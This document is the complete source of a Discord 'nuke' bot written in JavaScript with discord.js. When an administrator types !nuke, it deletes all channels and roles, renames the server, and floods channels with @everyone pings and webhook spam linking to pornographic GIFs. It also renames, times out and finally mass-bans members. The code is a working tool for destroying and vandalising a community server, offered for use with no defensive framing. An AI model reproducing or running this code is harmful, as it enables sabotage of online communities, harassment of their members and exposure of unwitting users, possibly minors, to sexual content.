require('dotenv').config();
const { Client, GatewayIntentBits, ChannelType, PermissionFlagsBits, Colors } = require('discord.js');

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildVoiceStates,
    GatewayIntentBits.GuildModeration,
  ],
});

// ================== CONFIG ==================
const TOKEN = process.env.TOKEN;
const TARGET_GUILD_ID = process.env.TARGET_GUILD_ID || null;
const PROTECTED_CHANNEL = 'aaaaaaaa';
const FINAL_TIMEOUT = 28 * 24 * 60 * 60 * 1000; // 28 days

let nukeActive = false;
let nukeInterval = null;
let nukeTimeout = null;
let currentMode = 'normal'; // 'normal' or 'very'

// ================== GIF SLOTS ==================
const GIF_TYPE_1 = [
  "https://klipy.com/gifs/orgasm-cumming-1"
];

const GIF_TYPE_2 = [
  "https://klipy.com/gifs/vegan-porn-carrot-porn"
];

// ================== LISTS ==================
const SERVER_NAMES = [
  'NUKED', 'OP NUKE', 'SERVER DEAD', 'OWNED', 'RIP', 'GET FUCKED',
  'NO SURVIVORS', 'BOT WON', 'DESTROYED', 'GOODBYE', 'MINIONS ACTIVE',
  'REALITY BROKEN', 'CHAOS OVERLOAD', 'TOTAL COLLAPSE', 'FINAL STAGE',
  'NO ESCAPE', 'WEBHOOK ARMY', 'ARMY ONLINE', 'BOSS RAGE', 'FULL AGGRO',
  'MULTI TASK', 'PARALLEL CHAOS', '5X OP', 'OVERPOWERED', 'VERY AGGRESSIVE'
];

const CHANNEL_NAMES = [
  'nuked', 'destroyed', 'owned', 'rip', 'get-fucked', 'dead', 'chaos', 'void',
  'pain', 'end', 'lmao', 'gg', 'bot-was-here', 'no-escape', 'server-corpse',
  'extreme-nuke', 'minion-zone', 'hallucination', 'glitch', 'error', 'deleted',
  'why', 'mute-zone', 'screaming', 'help', 'pain-chamber', 'final',
  'minion-spam', 'boss-room', 'collapse', 'broken', 'army', 'flood', 'wave',
  'aggro', 'rage', 'kill', 'multi', 'parallel', 'pressure', 'op', 'very'
];

const NICKNAMES = [
  'NUKED', 'OWNED', 'RIP', 'GET FUCKED', 'BOT PROPERTY', 'NO HOPE',
  'DESTROYED', 'SERVER CORPSE', 'VICTIM', 'MINION FOOD', 'MUTED',
  'SILENCED', 'BROKEN', 'ARMY TARGET', 'WEBHOOK VICTIM', 'BOSS TARGET',
  'RAGE VICTIM', 'AGGRO', 'MULTI VICTIM', 'PRESSURED', 'OP VICTIM'
];

const ROLE_NAMES = [
  'Nuked', 'Owned', 'Destroyed', 'RIP', 'Bot Property', 'No Hope', 'Minion',
  'Glitch', 'Muted', 'Silenced', 'Chaos', 'Victim', 'Army', 'Flooded',
  'Boss Marked', 'Rage', 'Aggro', 'Doomed', 'Parallel', 'Pressure', 'OP'
];

const MESSAGES = [
`@everyone`,`here`
];

const ARMY_NAMES = [
  'Minion', 'Army-1', 'Army-2', 'Flood', 'Screamer', 'Null', 'Hunter',
  'Breaker', 'Spammer', 'Ghost', 'Drone', 'Wave', 'Chaos', 'Destroyer',
  'Pain', 'Void', 'Error', 'Slave', 'Glitch', 'Overlord', 'Rage', 'Aggro',
  'OP-1', 'OP-2', 'OP-3'
];

const ARMY_MESSAGES = [
 `@everyone`,`here`
];

// ================== HELPERS ==================
function randomItem(arr) {
  if (!arr || arr.length === 0) return null;
  return arr[Math.floor(Math.random() * arr.length)];
}

function chance(percent) {
  return Math.random() * 100 < percent;
}

async function getOrCreateWebhook(channel, name = 'Minion') {
  try {
    const webhooks = await channel.fetchWebhooks();
    let webhook = webhooks.find(wh => wh.name === name);
    if (!webhook) {
      webhook = await channel.createWebhook({ name, reason: 'Webhook Army' });
    }
    return webhook;
  } catch (err) {
    return null;
  }
}

async function safeDelete(channel) {
  if (!channel || channel.name === PROTECTED_CHANNEL) return;
  await channel.delete('NUKE').catch(() => {});
}

// ================== FINAL BAN WAVE ==================
async function finalBanWave(guild) {
  console.log('🔪 FINAL BAN WAVE STARTING...');
  const members = await guild.members.fetch().catch(() => null);
  if (!members) return;

  let banned = 0, timedOut = 0, failed = 0;

  await Promise.all([...members.values()].map(async (member) => {
    if (member.user.bot || member.id === guild.ownerId) return;

    try {
      if (member.bannable) {
        await member.ban({ reason: 'NUKE - FINAL WAVE' });
        banned++;
        return;
      }
    } catch (e) {}

    try {
      if (member.moderatable) {
        await member.timeout(FINAL_TIMEOUT, 'NUKE - FALLBACK');
        timedOut++;
        return;
      }
    } catch (e) {}

    failed++;
  }));

  console.log(`✅ FINAL WAVE → Banned: ${banned} | Timed out: ${timedOut} | Failed: ${failed}`);
}

// ================== BOSS ACTIONS ==================
const bossActions = [
  async (guild) => {
    await guild.setName(randomItem(SERVER_NAMES)).catch(() => {});
  },

  async (guild) => {
    const channels = [...guild.channels.cache.values()];
    await Promise.all(channels.map(ch => safeDelete(ch)));
  },

  async (guild) => {
    const count = currentMode === 'very' ? 18 : 12;
    const tasks = [];
    for (let i = 0; i < count; i++) {
      tasks.push(
        guild.channels.create({
          name: randomItem(CHANNEL_NAMES),
          type: ChannelType.GuildText,
        }).then(ch => ch.send(randomItem(MESSAGES)).catch(() => {})).catch(() => {})
      );
    }
    await Promise.all(tasks);
  },

  async (guild) => {
    const count = currentMode === 'very' ? 10 : 6;
    const tasks = [];
    for (let i = 0; i < count; i++) {
      tasks.push(
        guild.channels.create({
          name: randomItem(['temp', 'flash', 'glitch', 'rage', 'aggro', 'op', 'kill']),
          type: ChannelType.GuildText,
        }).then(async ch => {
          await ch.send('👁').catch(() => {});
          setTimeout(() => ch.delete().catch(() => {}), 1200 + Math.random() * 2000);
        }).catch(() => {})
      );
    }
    await Promise.all(tasks);
  },

  async (guild) => {
    const roles = [...guild.roles.cache.values()];
    await Promise.all(
      roles.filter(r => r.id !== guild.id && r.editable)
           .map(r => r.delete('NUKE').catch(() => {}))
    );
  },

  async (guild) => {
    const count = currentMode === 'very' ? 14 : 9;
    const tasks = [];
    for (let i = 0; i < count; i++) {
      tasks.push(
        guild.roles.create({
          name: randomItem(ROLE_NAMES),
          color: randomItem([Colors.Red, Colors.DarkRed, Colors.Purple, Colors.Orange, Colors.Fuchsia]),
          reason: 'NUKE',
        }).catch(() => {})
      );
    }
    await Promise.all(tasks);
  },

  async (guild) => {
    const members = await guild.members.fetch().catch(() => null);
    if (!members) return;
    await Promise.all(
      [...members.values()]
        .filter(m => !m.user.bot && m.manageable)
        .map(m => m.setNickname(randomItem(NICKNAMES)).catch(() => {}))
    );
  },

  async (guild) => {
    const members = await guild.members.fetch().catch(() => null);
    if (!members) return;
    await Promise.all(
      [...members.values()]
        .filter(m => !m.user.bot && m.moderatable)
        .map(m => {
          const times = currentMode === 'very'
            ? [3600, 7200, 14400, 28800]
            : [1800, 3600, 7200, 14400];
          const time = times[Math.floor(Math.random() * times.length)] * 1000;
          return m.timeout(time, 'NUKE').catch(() => {});
        })
    );
  },

  async (guild) => {
    const channels = guild.channels.cache.filter(c =>
      c.type === ChannelType.GuildText &&
      c.permissionsFor(guild.members.me)?.has(PermissionFlagsBits.SendMessages)
    );
    const spamCount = currentMode === 'very' ? 10 : 6;
    const tasks = [];
    for (const channel of channels.values()) {
      for (let i = 0; i < spamCount; i++) {
        tasks.push(channel.send(randomItem(MESSAGES)).catch(() => {}));
      }
    }
    await Promise.all(tasks);
  },

  async (guild) => {
    const channels = guild.channels.cache.filter(c => c.manageable);
    await Promise.all(
      [...channels.values()].map(channel =>
        channel.permissionOverwrites.edit(guild.roles.everyone, {
          ViewChannel: chance(currentMode === 'very' ? 3 : 8),
          SendMessages: false,
          Connect: false,
          Speak: false,
          AddReactions: false,
          AttachFiles: false,
          EmbedLinks: false,
        }).catch(() => {})
      )
    );
  },

  async (guild) => {
    await guild.members.me.setNickname(randomItem([
      currentMode === 'very' ? 'VERY AGGRESSIVE' : 'NUKE',
      'OVERPOWERED', 'PARALLEL CHAOS', 'BOSS RAGE',
      'ARMY COMMANDER', 'OVERLORD', 'THE DESTROYER'
    ])).catch(() => {});
  },

  async (guild) => {
    const members = await guild.members.fetch().catch(() => null);
    const roles = [...guild.roles.cache.filter(r => r.editable && r.id !== guild.id).values()];
    if (!members || roles.length === 0) return;

    await Promise.all(
      [...members.values()]
        .filter(m => !m.user.bot && m.manageable)
        .map(m => {
          const role = randomItem(roles);
          return role ? m.roles.add(role).catch(() => {}) : Promise.resolve();
        })
    );
  },
];

// ================== WEBHOOK ARMY ==================
const armyActions = [
  async (guild) => {
    const channels = guild.channels.cache.filter(c =>
      c.type === ChannelType.GuildText &&
      c.permissionsFor(guild.members.me)?.has(PermissionFlagsBits.ManageWebhooks)
    );

    const nameCount = currentMode === 'very' ? 14 : 9;
    const spamPer = currentMode === 'very' ? 5 : 3;

    const tasks = [];
    for (const channel of channels.values()) {
      for (const name of ARMY_NAMES.slice(0, nameCount)) {
        tasks.push((async () => {
          const webhook = await getOrCreateWebhook(channel, name);
          if (!webhook) return;
          for (let i = 0; i < spamPer; i++) {
            const gif = Math.random() < 0.5 ? randomItem(GIF_TYPE_1) : randomItem(GIF_TYPE_2);
            await webhook.send({
              content: gif || randomItem(ARMY_MESSAGES),
              username: name,
            }).catch(() => {});
          }
        })());
      }
    }
    await Promise.all(tasks);
  },

  async (guild) => {
    const channels = guild.channels.cache.filter(c =>
      c.type === ChannelType.GuildText &&
      c.permissionsFor(guild.members.me)?.has(PermissionFlagsBits.ManageWebhooks)
    );

    const loops = currentMode === 'very' ? 10 : 6;
    const tasks = [];
    for (const channel of channels.values()) {
      for (let i = 0; i < loops; i++) {
        tasks.push((async () => {
          const webhook = await getOrCreateWebhook(channel, randomItem(ARMY_NAMES));
          if (!webhook) return;
          await webhook.send({
            content: randomItem(ARMY_MESSAGES),
            username: randomItem(ARMY_NAMES),
          }).catch(() => {});
        })());
      }
    }
    await Promise.all(tasks);
  },

  async (guild) => {
    const count = currentMode === 'very' ? 8 : 5;
    const tasks = [];
    for (let i = 0; i < count; i++) {
      tasks.push((async () => {
        try {
          const ch = await guild.channels.create({
            name: randomItem(['army-spam', 'op-wave', 'flood-zone', 'aggro', 'very']),
            type: ChannelType.GuildText,
          });
          for (const name of ARMY_NAMES.slice(0, 5)) {
            const webhook = await getOrCreateWebhook(ch, name);
            if (!webhook) continue;
            const gif = Math.random() < 0.5 ? randomItem(GIF_TYPE_1) : randomItem(GIF_TYPE_2);
            await webhook.send({
              content: gif || randomItem(ARMY_MESSAGES),
              username: name,
            }).catch(() => {});
          }
        } catch (e) {}
      })());
    }
    await Promise.all(tasks);
  },

  async (guild) => {
    const channels = guild.channels.cache.filter(c => c.type === ChannelType.GuildText);
    const tasks = [];
    for (const channel of channels.values()) {
      tasks.push((async () => {
        const webhook = await getOrCreateWebhook(channel, 'Glitch');
        if (!webhook) return;
        await webhook.send({
          content: randomItem(['👁', '💀', '🔥', '⚠️', '☠️', '💥', '🌀', '❌', '🩸']),
          username: randomItem(['Glitch', 'Null', 'Error', 'Void', 'Rage']),
        }).catch(() => {});
      })());
    }
    await Promise.all(tasks);
  },
];

// ================== TICK ==================
async function runNukeTick(guild) {
  if (!guild || !guild.members.me.permissions.has(PermissionFlagsBits.Administrator)) return;

  const bossCount = currentMode === 'very' ? 13 : 9;
  const armyCount = currentMode === 'very' ? 6 : 4;

  console.log(`\n======== ${currentMode.toUpperCase()} MODE TICK on ${guild.name} ========`);

  const selectedBoss = [...bossActions].sort(() => 0.5 - Math.random()).slice(0, bossCount);
  const selectedArmy = [...armyActions].sort(() => 0.5 - Math.random()).slice(0, armyCount);

  await Promise.all([
    ...selectedBoss.map(a => a(guild).catch(e => console.error('❌ Boss:', e.message))),
    ...selectedArmy.map(a => a(guild).catch(e => console.error('❌ Army:', e.message))),
  ]);
}

// ================== START NUKE ==================
async function startNuke(guild, message, mode = 'normal') {
  if (nukeActive) {
    if (message) await message.reply('⚠️ Nuke already running.');
    return;
  }

  currentMode = mode;
  nukeActive = true;

  const isVery = mode === 'very';
  const duration = 5 * 60 * 1000;
  const interval = isVery ? 2.2 * 1000 : 4 * 1000; // VERY mode is much faster

  if (message) {
    await message.reply(
      isVery
        ? '💣 **VERY AGGRESSIVE MODE STARTED**\nFaster ticks + heavier parallel load.'
        : '💣 **NORMAL AGGRESSIVE MODE STARTED**'
    );
  }

  console.log(`💣 NUKE STARTED → Mode: ${mode.toUpperCase()}`);

  await runNukeTick(guild);

  nukeInterval = setInterval(async () => {
    if (!nukeActive) return clearInterval(nukeInterval);
    await runNukeTick(guild);
  }, interval);

  nukeTimeout = setTimeout(async () => {
    nukeActive = false;
    clearInterval(nukeInterval);
    console.log('⏰ 5 MINUTES OVER → FINAL BAN WAVE');
    await finalBanWave(guild);
    console.log('🛑 NUKE FULLY ENDED');
  }, duration);
}

// ================== EVENTS ==================
client.once('ready', () => {
  console.log(`✅ Logged in as ${client.user.tag}`);
  console.log(`💣 DUAL MODE NUKE BOT READY`);
  console.log(`→ !nuke  = Normal Aggressive`);
  console.log(`→ !NUKE  = VERY Aggressive (faster + heavier)`);
});

client.on('messageCreate', async (message) => {
  if (message.author.bot || !message.guild) return;
  if (!message.member.permissions.has(PermissionFlagsBits.Administrator)) return;

  // Exact match for casing
  if (message.content === '!NUKE') {
    await startNuke(message.guild, message, 'very');
  } else if (message.content === '!nuke') {
    await startNuke(message.guild, message, 'normal');
  }

  if (message.content === '!nuke-stop' || message.content === '!NUKE-STOP') {
    nukeActive = false;
    if (nukeInterval) clearInterval(nukeInterval);
    if (nukeTimeout) clearTimeout(nukeTimeout);
    await message.reply('🛑 Nuke stopped.');
  }
});

client.login(TOKEN);
